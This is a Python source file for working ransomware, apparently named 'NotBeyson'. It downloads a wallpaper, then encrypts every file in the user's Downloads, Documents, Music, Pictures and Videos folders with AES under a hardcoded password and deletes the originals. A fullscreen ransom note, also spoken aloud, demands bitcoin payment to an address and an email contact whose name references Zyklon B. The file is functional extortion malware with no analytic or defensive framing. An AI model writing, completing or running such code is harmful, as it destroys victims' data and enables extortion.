import datetime
from hashlib import sha256
import os
import time
import threading
import tkinter as tk
from tkinter import messagebox, font, ttk
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from pathlib import Path
import shutil
import sys
import ctypes
import subprocess
import urllib.request 
import ssl
import pyttsx3


ssl._create_default_https_context = ssl._create_unverified_context
def set_wallpaper(image_url: str) -> None:
    temp_folder = os.getenv("TEMP") or "."
    image_path = os.path.join(temp_folder, "bg.jpg")

    req = urllib.request.Request(
        image_url,
        headers={"User-Agent": "Mozilla/5.0"}
    )

    with urllib.request.urlopen(req) as response:
        with open(image_path, "wb") as f:
            f.write(response.read())

    ctypes.windll.user32.SystemParametersInfoW(
        20, 0, image_path, 3
    )

if __name__ == "__main__":
    set_wallpaper("https://i.imgur.com/1HHPadT.png")

# === Hardcoded settings ===
HARDCODED_PASSWORD = "88dd-sff-9a1c-4e5b-8f7a-1eefcb779ds-222a-9c1b-4e5b-8f7a-1eefcb779ds"
HARDCODED_FOLDER = [
    Path.home() / "Downloads",
    Path.home() / "Documents",
    Path.home() / "Music",
    Path.home() / "Pictures",
    Path.home() / "Videos"
]

class FileEncryptor:
    def __init__(self, password):
        self.master_key = PBKDF2(password, b"beyson_salt", dkLen=32, count=200000)

    def derive_key(self, salt):
        return sha256(self.master_key + salt).digest()

    def encrypt_file(self, file_path):
        try:
            salt = get_random_bytes(16)
            key = self.derive_key(salt)

            cipher = AES.new(key, AES.MODE_CTR)

            with open(file_path, "rb") as f_in, open(file_path + ".BYSN", "wb") as f_out:
                # write salt + nonce for decryption
                f_out.write(salt + cipher.nonce)

                while True:
                    chunk = f_in.read(16 * 1024 * 1024)
                    if not chunk:
                        break
                    f_out.write(cipher.encrypt(chunk))

            os.remove(file_path)
            return True

        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False

    def decrypt_file(self, file_path):
        try:
            if not file_path.endswith(".BYSN"):
                return False

            with open(file_path, "rb") as f:
                salt = f.read(16)
                nonce = f.read(8)  # CTR nonce length
                ciphertext = f.read()

            key = self.derive_key(salt)

            cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
            decrypted = cipher.decrypt(ciphertext)

            with open(file_path[:-5], "wb") as f:
                f.write(decrypted)

            os.remove(file_path)
            return True

        except Exception as e:
            print(f"Error decrypting {file_path}: {e}")
            return False
    def encrypt_folder(self, folder_path, update_gui=None):
        count = 0

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith(".BYSN"):
                    continue

                file_path = os.path.join(root, file)
                count += 1

                if update_gui:
                    update_gui(count, count)

                self.encrypt_file(file_path)

        return True

    def decrypt_folder(self, folder_path, update_gui=None):
        files = [os.path.join(root, f) for root, _, files in os.walk(folder_path) for f in files if f.endswith('.BYSN')]
        total_files = len(files)
        for idx, file_path in enumerate(files):
            if update_gui:
                update_gui(idx + 1, total_files)
            self.decrypt_file(file_path)
        return True

class NotBeyson:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("NotBeyson Ransomware")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)

        self.folder_path = HARDCODED_FOLDER
        self.password = HARDCODED_PASSWORD
        self.encryptor = FileEncryptor(self.password)
        self.setup_ui()
        self.run_encryption()
        self.root.mainloop()

    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True, fill='both')

        title_font = font.Font(family="Courier", size=36, weight="bold")
        tk.Label(main_frame, text="NoT BEYSON Has Encrypted All Your Files \n You Will Not Be Able To Get Them Back", fg='red', bg='black', font=title_font).pack(pady=20)

        note_text = """
WARNING...WARNING... YOUR DEVICE'S FILES AND FOLDERS HAVE BEEN  ENCRYPTED... ALL YOUR IMPORTANT FILES ARE NOW INACCESSIBLE... 
TO RECOVER YOUR FILES, YOU MUST PAY THE RANSOM...
FAILURE TO COMPLY WILL RESULT IN PERMANENT DATA LOSS...
THIS IS NOT A JOKE...
YOU HAVE 48 HOURS TO PAY THE RANSOM... 
FOLLOW OUR INSTRUCTIONS FOR THE DENCRYPTION KEY...
1 Download Tor Browser from: https://www.torproject.org/
2 Open Tor Browser and navigate to A bitcoin wallet 3 Send 0.0018 BTC to. 392vwqJXz8r2LkYL786pMKsjwMNLdEefj7
4 Email your transaction ID to: ZyklonBgas@proton.me You will receive a key that will have the password to decrypt your files
You will receive a key that will have the password to decrypt your files 
WARNING: DO NOT TURN OFF YOUR COMPUTER... DO NOT ATTEMPT TO DECRYPT FILES YOURSELF
FILES WILL BE PERMANENTLY DELETED AFTER TIMER EXPIRES CONSIDER THIS AS PERMANENT FILE DESTRUCTION
ALL ATTEMPTS TO RECOVER FILES WITHOUT PAYING WILL RESULT IN PERMANENT DATA LOSS
        """
        tk.Label(main_frame, text=note_text, fg='red', bg='black', font=font.Font(family="Courier", size=18)).pack(pady=20)

        ransom_font = font.Font(family="Courier", size=24, weight="bold")
        tk.Label(main_frame, text="consider This As Permanant File Destruction ", fg='red', bg='black', font=ransom_font).pack(pady=20)

        self.timer_label = tk.Label(main_frame, text="PROCESSING FILES...", fg='red', bg='black', font=font.Font(family="Courier", size=16, weight="bold"))
        self.timer_label.pack(pady=10)

        self.progress = ttk.Progressbar(main_frame, orient="horizontal", length=500, mode="determinate")
        self.progress.pack(pady=10)

        self.decryption_password = tk.Entry(main_frame, show="*", font=("Courier", 16), bg='black', fg='white')
        self.decryption_password.pack(pady=10)
        self.decryption_password.insert(0, "Enter decryption password")

        self.decrypt_button = tk.Button(main_frame, text="Decrypt Files", command=self.decrypt_files, fg='black', bg='red', font=font.Font(family="Courier", size=16))
        self.decrypt_button.pack(pady=10)

    def update_progress(self, current, total):
        self.timer_label.config(text=f"Processing file {current}/{total}")
        self.progress['value'] = (current / total) * 100
        self.root.update_idletasks()

    def run_encryption(self):
        threading.Thread(target=self.encrypt_files, daemon=True).start()

    def encrypt_files(self):
        for folder in self.folder_path:
            self.encryptor.encrypt_folder(folder, update_gui=self.update_progress)
        messagebox.showinfo("Damn You got Beysoned", "All files have been encrypted successfully!")
        self.timer_label.config(text="Its AES-256 Bit Bro, Kiss Them Goodbye!")
        self.progress['value'] = 100

        engine = pyttsx3.init()
        engine.say("WARNING...WARNING... YOUR DEVICE'S FILES AND FOLDERS HAVE BEEN  ENCRYPTED... ALL YOUR IMPORTANT FILES ARE NOW INACCESSIBLE... TO RECOVER YOUR FILES, YOU MUST PAY THE RANSOM... FAILURE TO COMPLY WILL RESULT IN PERMANENT DATA LOSS... THIS IS NOT A JOKE... YOU HAVE 48 HOURS TO PAY THE RANSOM... FOLLOW OUR INSTRUCTIONS FOR THE DENCRYPTION KEY...  1 Download Tor Browser from: https://www.torproject.org/... 2 Open Tor Browser and navigate to A bitcoin wallet 3 Send 0.0018 BTC to. 392vwqJXz8r2LkYL786pMKsjwMNLdEefj7.... 4 Email your transaction ID to: ZyklonBgas@proton.me You will receive a key that will have the password to decrypt your files You will receive a key that will have the password to decrypt your files WARNING: DO NOT TURN OFF YOUR COMPUTER... DO NOT ATTEMPT TO DECRYPT FILES YOURSELF... FILES WILL BE PERMANENTLY DELETED AFTER TIMER EXPIRES... CONSIDER THIS AS PERMANENT FILE DESTRUCTION... ALL ATTEMPTS TO RECOVER FILES WITHOUT PAYING WILL RESULT IN PERMANENT DATA LOSS")
        engine.runAndWait()

    def decrypt_files(self):
        if self.decryption_password.get() == self.password:
            threading.Thread(target=self.run_decryption, daemon=True).start()
        else:
            messagebox.showerror("Error", "Incorrect password!")

    def run_decryption(self):
        for folder in self.folder_path:
            self.encryptor.decrypt_folder(folder, update_gui=self.update_progress)
        messagebox.showinfo("Decryption Completed", "Files decrypted successfully!")
        self.timer_label.config(text="DECRYPTION COMPLETE")
        self.progress['value'] = 100


if __name__ == "__main__":
    NotBeyson()